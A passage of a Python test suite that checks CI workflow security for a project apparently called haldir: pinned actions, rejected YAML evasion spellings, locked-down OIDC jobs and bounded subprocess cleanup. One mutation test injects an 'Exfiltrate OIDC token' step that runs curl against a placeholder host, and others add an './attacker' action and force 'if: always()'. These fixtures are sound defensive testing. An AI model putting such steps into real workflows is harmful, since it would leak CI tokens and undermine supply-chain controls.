                    BRIDGE.FR0015_ACTIVATION_NAMESPACE,
                }
            ),
            6,
        )

    def test_all_uses_syntax_is_accounted(self) -> None:
        uses, problems = PINS.collect_uses(
            "steps:\n  - uses: owner/action@" + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertEqual(len(uses), 1)
        self.assertEqual(problems, [])

    def test_quoted_uses_key_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            '"uses": owner/action@' + "a" * 40 + "\n",
            label="fixture",
        )
        self.assertTrue(problems)

    def test_yaml_equivalent_uses_spellings_are_rejected(self) -> None:
        mutable = "actions/checkout@main"
        evasions = {
            "escaped-key": f'"u\\u0073es": {mutable}\n',
            "explicit-tagged-key": f"? !!str uses\n: {mutable}\n",
            "flow-mapping": f"job: {{ uses: {mutable} }}\n",
            "flow-pair": f'steps: ["uses": {mutable}]\n',
            "tagged-key": f"!!str uses: {mutable}\n",
            "block-scalar-dedent": (
                "steps:\n"
                "  - run: |\n"
                "        echo deliberately over-indented\n"
                f'    "u\\u0073es": {mutable}\n'
            ),
            "empty-block-scalar-sibling": (
                f'steps:\n  - run: |\n    "u\\u0073es": {mutable}\n'
            ),
        }
        for label, text in evasions.items():
            with self.subTest(label=label):
                _uses, problems = PINS.collect_uses(text, label="fixture")
                self.assertTrue(problems)

    def test_current_workflows_use_the_restricted_yaml_subset(self) -> None:
        for path in sorted((ROOT / ".github/workflows").glob("*.y*ml")):
            with self.subTest(path=path.name):
                self.assertEqual(
                    PINS.validate_workflow_syntax(
                        path.read_text(),
                        label=path.name,
                    ),
                    [],
                )

    def test_mutable_container_is_rejected(self) -> None:
        _uses, problems = PINS.collect_uses(
            "uses: docker://alpine:latest\n", label="fixture"
        )
        self.assertTrue(problems)

    def test_local_actions_and_job_containers_are_rejected(self) -> None:
        uses, problems = PINS.collect_uses(
            "steps:\n  - uses: ./unreviewed-action\n",
            label="fixture",
        )
        self.assertEqual(uses, [])
        self.assertTrue(problems)
        for key in ("container", "services"):
            with self.subTest(key=key):
                self.assertTrue(
                    PINS.validate_workflow_syntax(
                        f"jobs:\n  test:\n    {key}: unreviewed\n",
                        label="fixture",
                    )
                )

    def test_supply_chain_job_is_bound_byte_for_byte(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        self.assertEqual(
            PINS.verify_supply_chain_job(ci, label="ci"),
            [],
        )
        for original, replacement in (
            ("--no-new-privs", "--keep-groups"),
            ("/usr/bin/env -i", "/usr/bin/env"),
            ('CARGO_HOME="$FINAL_CARGO_HOME"', 'CARGO_HOME="/tmp/other"'),
            ("--max-filesize", "--limit-rate"),
        ):
            mutated = ci.replace(original, replacement, 1)
            with self.subTest(original=original):
                self.assertTrue(PINS.verify_supply_chain_job(mutated, label="ci"))

    def test_oidc_jobs_have_no_repository_execution(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        formal = (ROOT / ".github/workflows/formal.yml").read_text()
        self.assertEqual(
            PINS.verify_oidc_job(
                ci,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            ),
            [],
        )
        self.assertEqual(
            PINS.verify_oidc_job(
                formal,
                label="formal",
                job="attest-formal-audit-result",
                expected_needs=("tlc-model-check",),
            ),
            [],
        )

    def test_oidc_local_action_mutation_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        mutated = ci.replace(
            "      - name: Download immutable audit result",
            "      - uses: ./attacker\n      - name: Download immutable audit result",
        )
        problems = PINS.verify_oidc_job(
            mutated,
            label="ci",
            job="attest-ci-audit-result",
            expected_needs=(
                "build-test",
                "clean-build",
                "feature-matrix",
                "interop",
                "macos-compile",
                "supply-chain",
            ),
        )
        self.assertTrue(problems)

    def test_oidc_commented_condition_and_always_are_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        condition = (
            "    if: >-\n"
            "      github.repository == 'sepahead/haldir' &&\n"
            "      github.event_name == 'push' &&\n"
            "      github.ref == 'refs/heads/main'\n"
        )
        replacement = (
            "    # if: >-\n"
            "    #   github.repository == 'sepahead/haldir' &&\n"
            "    #   github.event_name == 'push' &&\n"
            "    #   github.ref == 'refs/heads/main'\n"
            "    if: always()\n"
        )
        mutated = ci.replace(condition, replacement, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_oidc_injected_shell_step_is_rejected(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        marker = "      - name: Download immutable audit result\n"
        injected = (
            "      - name: Exfiltrate OIDC token\n"
            "        run: curl https://example.invalid\n" + marker
        )
        mutated = ci.replace(marker, injected, 1)
        self.assertNotEqual(mutated, ci)
        self.assertTrue(
            PINS.verify_oidc_job(
                mutated,
                label="ci",
                job="attest-ci-audit-result",
                expected_needs=(
                    "build-test",
                    "clean-build",
                    "feature-matrix",
                    "interop",
                    "macos-compile",
                    "supply-chain",
                ),
            )
        )

    def test_attempt_qualified_unarchived_outputs(self) -> None:
        for workflow in ("ci", "formal"):
            text = (ROOT / f".github/workflows/{workflow}.yml").read_text()
            self.assertIn("archive: false", text)
            self.assertIn(
                f"epoch-18-{workflow}-result-attempt-${{{{ github.run_attempt }}}}.json",
                text,
            )
            self.assertNotIn(f"name: epoch-18-{workflow}-result-attempt", text)

    def test_ci_result_materials_cover_every_executed_recovery_module(self) -> None:
        protocol_materials = PROTOCOL.RESULT_CONTRACT["ci"]["material_paths"]
        emitter_materials = RESULT.WORKFLOW_CONTRACT["ci"]["materials"]
        self.assertEqual(emitter_materials, protocol_materials)
        materials = set(protocol_materials)
        self.assertTrue(
            {
                BRIDGE.GATE_PATH,
                BRIDGE.MODULE_PATH,
                BRIDGE.CAPTURE_PATH,
                BRIDGE.RESULT_PATH,
                BRIDGE.BRIDGE_PATH,
                BRIDGE.TEST_PATH,
                BRIDGE.FORMAL_RUNNER_PATH,
                BRIDGE.FORMAL_RUNNER_TEST_PATH,
                BRIDGE.FORMAL_README_PATH,
                BRIDGE.JUSTFILE_PATH,
            }.issubset(materials)
        )

    def test_formal_result_command_matches_the_fail_closed_invocation(self) -> None:
        expected = (
            "/usr/bin/env -u JAVA_TOOL_OPTIONS -u _JAVA_OPTIONS "
            "-u JDK_JAVA_OPTIONS LC_ALL=C "
            '"${JAVA_HOME}/bin/java" -XX:+UseParallelGC '
            '-cp "$TLA_TOOLS_PATH" tlc2.TLC -workers auto '
            "-config formal/HaldirAuthority.cfg formal/HaldirAuthority.tla"
        )
        self.assertEqual(PROTOCOL.RESULT_CONTRACT["formal"]["command"], expected)
        self.assertEqual(RESULT.WORKFLOW_CONTRACT["formal"]["command"], expected)
        self.assertEqual(BRIDGE.FORMAL_WORKFLOW_COMMAND, expected)
        formal_workflow = (ROOT / BRIDGE.FORMAL_WORKFLOW_PATH).read_text()
        self.assertNotIn("actions/setup-java@", formal_workflow)
        self.assertIn(
            "      - name: Fetch and install pinned Temurin JRE\n",
            formal_workflow,
        )
        self.assertIn(
            "      - name: Verify exact Temurin runtime identity\n",
            formal_workflow,
        )

    def test_pr_replacement_commands_restore_each_skipped_gate_suite(self) -> None:
        expected = (
            (
                "python3 -I -B -W error "
                "tools/release/test_verify_framework_recovery_fr_0017.py"
            ),
            "python3 -I -B -W error tools/test_pinned_cargo_deny.py",
            "python3 -I -B -W error tools/test_run_formal.py",
        )
        self.assertEqual(PINS.PR_RECOVERY_COMMANDS, expected)
        ci_workflow = (ROOT / BRIDGE.CI_WORKFLOW_PATH).read_text()
        positions = [ci_workflow.find(command) for command in expected]
        self.assertTrue(all(position >= 0 for position in positions))
        self.assertEqual(positions, sorted(positions))
        for command in expected:
            mutated = ci_workflow.replace(command, "python3 -I -B -W error no-op.py", 1)
            with self.subTest(command=command):
                self.assertTrue(
                    PINS.verify_pr_recovery_step(
                        mutated,
                        label=BRIDGE.CI_WORKFLOW_PATH,
                    )
                )

    def test_github_cli_archive_is_immutable(self) -> None:
        ci = (ROOT / ".github/workflows/ci.yml").read_text()
        self.assertEqual(BRIDGE.GH_CLI_VERSION, "2.96.0")
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_ARCHIVE_BYTES), ci)
        self.assertIn(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_SHA256, ci)
        self.assertIn(str(BRIDGE.GH_CLI_LINUX_AMD64_BINARY_BYTES), ci)
        self.assertIn(
            "releases/download/v${GH_CLI_VERSION}/"
            "gh_${GH_CLI_VERSION}_linux_amd64.tar.gz",
            ci,
        )
        self.assertIn("--proto '=https'", ci)
        self.assertIn("--proto-redir '=https'", ci)
        self.assertIn("--tlsv1.2", ci)
        self.assertIn(
            '-- "gh_${GH_CLI_VERSION}_linux_amd64/bin/gh"',
            ci,
        )
        self.assertIn("sha256sum --check --strict", ci)
        self.assertNotIn("curl |", ci)

    def test_hosted_runner_labels_are_versioned(self) -> None:
        for workflow, expected in PINS.EXPECTED_RUNNERS.items():
            text = (ROOT / ".github/workflows" / workflow).read_text()
            self.assertEqual(
                Counter(PINS.RUNS_ON_LINE.findall(text)),
                expected,
            )
            self.assertFalse(
                any(
                    label.endswith("-latest")
                    for label in PINS.RUNS_ON_LINE.findall(text)
                )
            )

    def test_gate_does_not_execute_legacy_verifier(self) -> None:
        text = (ROOT / BRIDGE.GATE_PATH).read_text()
        self.assertNotIn("verify-current-audit.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0010.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0011.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0012.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0013.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0014.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0015.py", text)
        self.assertNotIn("verify-framework-recovery-fr-0016.py", text)
        self.assertIn("verify-framework-recovery-fr-0017.py", text)
        self.assertIn("which --toolchain 1.96.0 cargo", text)
        self.assertIn('"cargo 1.96.0 ("*")"', text)
        self.assertIn(
            'export PATH="${PYTHON3%/*}:${CARGO%/*}:/usr/bin:/bin"',
            text,
        )

    def test_new_root_never_imports_fr0010_through_fr0016_python(self) -> None:
        legacy_modules = (
            "framework_recovery_fr_0010",
            "framework_recovery_fr_0011",
            "framework_recovery_fr_0012",
            "verify-framework-recovery-fr-0010",
            "verify-framework-recovery-fr-0011",
            "verify-framework-recovery-fr-0012",
            "framework_recovery_fr_0013",
            "verify-framework-recovery-fr-0013",
            "framework_recovery_fr_0014",
            "verify-framework-recovery-fr-0014",
            "framework_recovery_fr_0015",
            "verify-framework-recovery-fr-0015",
            "framework_recovery_fr_0016",
            "verify-framework-recovery-fr-0016",
        )
        for relative in (
            BRIDGE.MODULE_PATH,
            BRIDGE.CAPTURE_PATH,
            BRIDGE.RESULT_PATH,
            BRIDGE.BRIDGE_PATH,
        ):
            source = (ROOT / relative).read_text()
            for module in legacy_modules:
                with self.subTest(relative=relative, module=module):
                    self.assertNotIn(f"import {module}", source)
                    self.assertNotIn(f"from {module}", source)

    def test_legacy_boundary_does_not_import_historical_python(self) -> None:
        with mock.patch.object(
            BRIDGE.importlib.util,
            "spec_from_file_location",
            side_effect=AssertionError("historical Python import attempted"),
        ):
            BRIDGE._verify_legacy_boundary(ROOT)

    def test_legacy_boundary_does_not_execute_historical_python(self) -> None:
        historical_paths = {
            "tools/release/verify-framework-recovery-fr-0010.py",
            "tools/release/verify-framework-recovery-fr-0011.py",
            "tools/release/verify-framework-recovery-fr-0012.py",
            "tools/release/verify-framework-recovery-fr-0013.py",
            "tools/release/verify-framework-recovery-fr-0014.py",
            "tools/release/verify-framework-recovery-fr-0015.py",
            "tools/release/framework_recovery_fr_0010.py",
            "tools/release/framework_recovery_fr_0011.py",
            "tools/release/framework_recovery_fr_0012.py",
            "tools/release/framework_recovery_fr_0013.py",
            "tools/release/framework_recovery_fr_0014.py",
            "tools/release/framework_recovery_fr_0015.py",
            "tools/release/verify-framework-recovery-fr-0016.py",
            "tools/release/framework_recovery_fr_0016.py",
            "tools/release/framework_recovery_fr_0016_capture.py",
            "tools/release/framework_recovery_fr_0016_result.py",
            "tools/release/test_verify_framework_recovery_fr_0016.py",
        }
        real_run = subprocess.run

        def guarded_run(*arguments: Any, **keywords: Any) -> Any:
            command = arguments[0]
            executable = Path(command[0]).name
            if executable.startswith("python") and historical_paths.intersection(
                command[1:]
            ):
                raise AssertionError("historical Python execution attempted")
            return real_run(*arguments, **keywords)

        with mock.patch.object(BRIDGE.subprocess, "run", side_effect=guarded_run):
            BRIDGE._verify_legacy_boundary(ROOT)

    def test_reserved_legacy_completion_paths_are_protected(self) -> None:
        reserved = (
            BRIDGE.FR0010_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0011_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0012_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0013_FORBIDDEN_COMPLETION_PATHS
            | BRIDGE.FR0016_FORBIDDEN_COMPLETION_PATHS
        )
        self.assertTrue(reserved)
        self.assertTrue(reserved <= BRIDGE.PROTECTED_AFTER_ACTIVATION)
        self.assertIn(
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0011-qualification.json"
            ),
            reserved,
        )
        expected_fr0012 = {
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-qualification.json"
            ),
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-activation.json"
            ),
            *{
                (
                    "release/0.9.0/current-head/evidence/"
                    f"framework-recovery-fr-0012-{suffix}.json"
                )
                for suffix in (
                    "r-ci-capture",
                    "r-ci-result",
                    "r-ci-attestation",
                    "r-formal-capture",
                    "r-formal-result",
                    "r-formal-attestation",
                    "r-local",
                    "q-ci-capture",
                    "q-ci-result",
                    "q-ci-attestation",
                    "q-formal-capture",
                    "q-formal-result",
                    "q-formal-attestation",
                    "branch-protection",
                )
            },
        }
        self.assertEqual(
            BRIDGE.FR0012_FORBIDDEN_COMPLETION_PATHS,
            expected_fr0012,
        )
        expected_fr0013 = {
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0013-activation.json"
            ),
            *{
                (
                    "release/0.9.0/current-head/evidence/"
                    f"framework-recovery-fr-0013-{suffix}.json"
                )
                for suffix in (
                    "q-ci-capture",
                    "q-ci-result",
                    "q-ci-attestation",
                    "q-formal-capture",
                    "q-formal-result",
                    "q-formal-attestation",
                    "branch-protection",
                )
            },
        }
        self.assertEqual(
            BRIDGE.FR0013_FORBIDDEN_COMPLETION_PATHS,
            expected_fr0013,
        )
        expected_fr0016 = {
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0016-qualification.json"
            ),
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0016-activation.json"
            ),
            *{
                (
                    "release/0.9.0/current-head/evidence/"
                    f"framework-recovery-fr-0016-{suffix}.json"
                )
                for suffix in (
                    "r-ci-capture",
                    "r-ci-result",
                    "r-ci-attestation",
                    "r-formal-capture",
                    "r-formal-result",
                    "r-formal-attestation",
                    "r-local",
                    "r-pull-request",
                    "q-ci-capture",
                    "q-ci-result",
                    "q-ci-attestation",
                    "q-formal-capture",
                    "q-formal-result",
                    "q-formal-attestation",
                    "branch-protection",
                    "hosted-settings",
                )
            },
        }
        self.assertEqual(
            BRIDGE.FR0016_FORBIDDEN_COMPLETION_PATHS,
            expected_fr0016,
        )

    def test_recovery_namespace_variants_are_protected(self) -> None:
        forbidden = (
            (
                "release/0.9.0/current-head/closures/framework-recovery/"
                "FR-0012-qualification-forged.json"
            ),
            (
                "release/0.9.0/current-head/closures/Framework-Recovery/"
                "alternate-name.json"
            ),
            (
                "release/0.9.0/current-head/evidence/"
                "framework-recovery-fr-0012-r-local.json.bak"
            ),
            (
                "release/0.9.0/current-head/reviews/"
                "FRAMEWORK-RECOVERY-FR-0010-shadow.json"
            ),
            (
                "release/0.9.0/current-head/evidence/"
                "FRAMEWORK-RECOVERY-FR-0016-r-ci-capture.json"
            ),
        )
        for path in forbidden:
            with self.subTest(path=path):
                self.assertTrue(BRIDGE._successor_path_protected(path))
        permitted = (
            "release/0.9.0/current-head/requirements.json",
            "release/0.9.0/current-head/evidence/tasks/ch-t001/e0003.json",
            "crates/haldir-core/src/lib.rs",
        )
        for path in permitted:
            with self.subTest(path=path):
                self.assertFalse(BRIDGE._successor_path_protected(path))


class BoundedProcessTests(unittest.TestCase):
    def environment(self) -> dict[str, str]:
        return {
            "LC_ALL": "C",
            "PATH": f"{Path(sys.executable).parent}:/usr/bin:/bin",
        }

    def run_python(
        self,
        source: str,
        *,
        timeout: float = 2,
        limit: int = 4096,
    ) -> tuple[int, bytes, bytes]:
        return BRIDGE._run_bounded(
            (sys.executable, "-I", "-B", "-W", "error", "-c", source),
            cwd=ROOT,
            env=self.environment(),
            timeout_seconds=timeout,
            output_limit=limit,
        )

    def assert_pid_dead(self, pid: int) -> None:
        deadline = time.monotonic() + 2
        while time.monotonic() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return
            proc_stat = Path(f"/proc/{pid}/stat")
            try:
                if proc_stat.is_file() and proc_stat.read_text().split()[2] == "Z":
                    return
            except (FileNotFoundError, ProcessLookupError):
                return
            time.sleep(0.02)
        self.fail(f"process {pid} survived bounded cleanup")

    def assert_no_live_process_group(self, pgid: int) -> None:
        deadline = time.monotonic() + 2
        proc_root = Path("/proc")
        while time.monotonic() < deadline:
            if proc_root.is_dir():
                live_members: list[int] = []
                for candidate in proc_root.iterdir():
                    if not candidate.name.isdigit():
                        continue
                    try:
                        raw = (candidate / "stat").read_text()
                        fields = raw[raw.rindex(")") + 2 :].split()
                        state = fields[0]
                        member_pgid = int(fields[2])
                    except (
                        FileNotFoundError,
                        ProcessLookupError,
                        IndexError,
                        ValueError,
                    ):
                        continue
                    if member_pgid == pgid and state != "Z":
                        live_members.append(int(candidate.name))
                if not live_members:
                    return
            else:
                try:
                    os.killpg(pgid, 0)
                except (ProcessLookupError, PermissionError):
                    return
            time.sleep(0.02)
        self.fail(f"process group {pgid} retained a live member")

    def test_proc_stat_disappearance_is_a_dead_process(self) -> None:
        for exception in (FileNotFoundError, ProcessLookupError):
            with (
                self.subTest(exception=exception.__name__),
                mock.patch.object(os, "kill", return_value=None),
                mock.patch.object(Path, "is_file", return_value=True),
                mock.patch.object(Path, "read_text", side_effect=exception),
            ):
                self.assert_pid_dead(424_242)

    def test_proc_group_scan_skips_disappearing_stat(self) -> None:
        for exception in (FileNotFoundError, ProcessLookupError):
            with (
                self.subTest(exception=exception.__name__),
                mock.patch.object(Path, "is_dir", return_value=True),
                mock.patch.object(
                    Path,
                    "iterdir",
                    return_value=iter((Path("/proc/424242"),)),
                ),
                mock.patch.object(Path, "read_text", side_effect=exception),
            ):
                self.assert_no_live_process_group(424_242)

    @contextmanager
    def capture_processes(
        self,
    ) -> Iterator[list[subprocess.Popen[bytes]]]:
        real_popen = subprocess.Popen
        captured: list[subprocess.Popen[bytes]] = []

        def recording_popen(
            *arguments: Any,
            **keywords: Any,
        ) -> subprocess.Popen[bytes]:
            process = real_popen(*arguments, **keywords)
            captured.append(process)
            return process

        try:
            with mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=recording_popen,
            ):
                yield captured
        finally:
            for process in captured:
                if process.returncode is None:
                    try:
                        os.killpg(process.pid, signal.SIGKILL)
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.kill()
                    except (OSError, ProcessLookupError):
                        pass
                    try:
                        process.wait(timeout=5)
                    except (OSError, subprocess.TimeoutExpired):
                        pass
                for pipe in (process.stdout, process.stderr):
                    if pipe is not None:
                        pipe.close()

    def assert_process_cleaned(
        self,
        process: subprocess.Popen[bytes],
    ) -> None:
        self.assertIsNotNone(process.returncode)
        self.assertIsNotNone(process.stdout)
        self.assertIsNotNone(process.stderr)
        assert process.stdout is not None
        assert process.stderr is not None
        self.assertTrue(process.stdout.closed)
        self.assertTrue(process.stderr.closed)

    def test_success_and_nonzero_are_returned_exactly(self) -> None:
        result = self.run_python(
            "import sys;sys.stdout.buffer.write(b'out');sys.stderr.buffer.write(b'err')"
        )
        self.assertEqual(result, (0, b"out", b"err"))
        result = self.run_python("import sys;sys.exit(7)")
        self.assertEqual(result, (7, b"", b""))

    def test_exact_combined_limit_passes_and_first_extra_byte_fails(self) -> None:
        result = self.run_python(
            "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2048)",
            limit=4096,
        )
        self.assertEqual(result[0], 0)
        self.assertEqual(len(result[1]) + len(result[2]), 4096)
        with self.assertRaisesRegex(BRIDGE.BridgeError, "OUTPUT_BOUND"):
            self.run_python(
                "import os;os.write(1,b'a'*2048);os.write(2,b'b'*2049)",
                limit=4096,
            )

    def test_concurrent_large_streams_do_not_deadlock_or_lose_bytes(self) -> None:
        unit = 4096
        repetitions = 64
        source = (
            "import os,threading\n"
            "def write_all(descriptor, byte):\n"
            f"    for _ in range({repetitions}):\n"
            f"        os.write(descriptor, byte*{unit})\n"
            "threads=(threading.Thread(target=write_all,args=(1,b'a')),"
            "threading.Thread(target=write_all,args=(2,b'b')))\n"
            "[thread.start() for thread in threads]\n"
            "[thread.join() for thread in threads]\n"
        )
        expected = unit * repetitions
        result = self.run_python(
            source,
            timeout=5,
            limit=expected * 2,
        )
        self.assertEqual(result, (0, b"a" * expected, b"b" * expected))

    def test_child_closing_pipes_then_sleeping_is_domain_timeout(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "leader.pid"
            source = (
                "import os,pathlib,time;"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(os.getpid()));"
                "os.close(1);os.close(2);time.sleep(30)"
            )
            started = time.monotonic()
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_TIMEOUT"):
                self.run_python(source, timeout=0.5)
            self.assertLess(time.monotonic() - started, 2)
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_descendant_holding_pipes_is_killed_as_a_group(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            process_path = Path(name) / "descendant.json"
            descendant = "import time;time.sleep(30)"
            source = (
                "import json,os,pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}));"
                f"pathlib.Path({str(process_path)!r}).write_text(json.dumps("
                "{'pid':p.pid,'pgid':os.getpgid(p.pid),"
                "'leader_pgid':os.getpgrp()}));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            identity = json.loads(process_path.read_text())
            self.assertEqual(identity["pgid"], identity["leader_pgid"])
            self.assertGreater(identity["pgid"], 1)
            self.assert_pid_dead(identity["pid"])
            self.assert_no_live_process_group(identity["pgid"])

    def test_success_path_kills_same_group_descendant_before_reaping(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            pid_path = Path(name) / "descendant.pid"
            descendant = "import time;time.sleep(30)"
            source = (
                "import pathlib,subprocess,sys;"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{descendant!r}),"
                "stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);"
                f"pathlib.Path({str(pid_path)!r}).write_text(str(p.pid));"
                "p.returncode=0"
            )
            result = self.run_python(source)
            self.assertEqual(result, (0, b"", b""))
            self.assert_pid_dead(int(pid_path.read_text()))

    def test_setsid_escape_is_disclosed_cleanup_failure_not_containment(
        self,
    ) -> None:
        with tempfile.TemporaryDirectory() as name:
            identity_path = Path(name) / "escaped.json"
            escaped = (
                "import json,os,pathlib,time;"
                "os.setsid();"
                f"pathlib.Path({str(identity_path)!r}).write_text(json.dumps("
                "{'pid':os.getpid(),'pgid':os.getpgrp(),"
                "'sid':os.getsid(0)}));"
                "time.sleep(30)"
            )
            source = (
                "import pathlib,subprocess,sys,time\n"
                f"path=pathlib.Path({str(identity_path)!r})\n"
                f"p=subprocess.Popen((sys.executable,'-I','-B','-c',{escaped!r}))\n"
                "deadline=time.monotonic()+2\n"
                "while not path.is_file() and time.monotonic()<deadline:\n"
                "    time.sleep(0.005)\n"
                "if not path.is_file():\n"
                "    raise RuntimeError('setsid fixture did not synchronize')\n"
                "p.returncode=0\n"
            )
            escaped_pid: int | None = None
            try:
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python(source, timeout=5)
                identity = json.loads(identity_path.read_text())
                escaped_pid = identity["pid"]
                self.assertEqual(identity["pid"], identity["pgid"])
                self.assertEqual(identity["pid"], identity["sid"])
                os.kill(escaped_pid, 0)
            finally:
                if escaped_pid is None and identity_path.is_file():
                    escaped_pid = json.loads(identity_path.read_text())["pid"]
                if escaped_pid is not None:
                    try:
                        os.kill(escaped_pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
                    self.assert_pid_dead(escaped_pid)

    def test_invalid_bounds_fail_before_selector_or_process_creation(self) -> None:
        invalid_timeouts = (
            True,
            "1",
            None,
            float("nan"),
            float("inf"),
            float("-inf"),
            0,
            -1,
        )
        for value in invalid_timeouts:
            with (
                self.subTest(timeout=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=value,
                        output_limit=1,
                    )
                selector.assert_not_called()
                popen.assert_not_called()
        invalid_limits = (True, 1.0, "1", None, -1)
        for value in invalid_limits:
            with (
                self.subTest(limit=value),
                mock.patch.object(BRIDGE.selectors, "DefaultSelector") as selector,
                mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_BOUND",
                ):
                    BRIDGE._run_bounded(
                        (sys.executable, "-c", "pass"),
                        cwd=ROOT,
                        env=self.environment(),
                        timeout_seconds=1,
                        output_limit=value,
                    )
                selector.assert_not_called()
                popen.assert_not_called()

    def test_selector_construction_precedes_process_spawn(self) -> None:
        sentinel = OSError(24, "selector-construction")
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                side_effect=sentinel,
            ),
            mock.patch.object(BRIDGE.subprocess, "Popen") as popen,
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
            popen.assert_not_called()

    def test_popen_failure_closes_preacquired_selector(self) -> None:
        selector = mock.Mock()
        with (
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE.subprocess,
                "Popen",
                side_effect=OSError(24, "popen-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("pass")
        selector.close.assert_called_once_with()

    def test_selector_and_read_exceptions_cleanup_every_resource(self) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        selector.select.side_effect = OSError(5, "selector-failure")
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        selector.close.assert_called_once_with()

        real_read = os.read
        with self.capture_processes() as processes:

            def fail_bridge_read(
                descriptor: int,
                size: int,
            ) -> bytes:
                if processes:
                    raise OSError(5, "read-failure")
                return real_read(descriptor, size)

            with mock.patch.object(
                BRIDGE.os,
                "read",
                side_effect=fail_bridge_read,
            ):
                with self.assertRaisesRegex(
                    BRIDGE.BridgeError,
                    "PROCESS_CLEANUP",
                ):
                    self.run_python("import os,time;os.write(1,b'x');time.sleep(30)")
                self.assertEqual(len(processes), 1)
                self.assert_process_cleaned(processes[0])

    def test_cleanup_failure_has_a_distinct_domain_error(self) -> None:
        with (
            self.capture_processes() as processes,
            mock.patch.object(BRIDGE, "_kill_process_group", return_value=False),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_close_pipe",
                return_value=False,
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("pass")
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])
        with (
            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("injected-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(BRIDGE.BridgeError, "PROCESS_CLEANUP"):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            self.assert_process_cleaned(processes[0])

    def test_double_termination_failure_still_closes_selector_and_pipes(
        self,
    ) -> None:
        real_selector = BRIDGE.selectors.DefaultSelector()
        selector = mock.Mock(wraps=real_selector)
        with (
